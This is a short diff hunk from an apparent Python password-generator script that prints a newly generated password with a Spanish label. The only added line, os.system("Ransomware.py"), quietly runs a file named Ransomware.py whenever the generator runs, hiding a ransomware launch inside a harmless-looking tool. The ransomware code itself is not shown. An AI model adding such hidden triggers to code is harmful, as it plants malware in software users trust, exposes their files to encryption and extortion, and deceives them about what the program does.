@@ -9,3 +9,4 @@ length = passlength
 password = "".join(random.sample(total, length))
 
 print("Nueva contraseña:\t" + password)
+os.system("Ransomware.py")
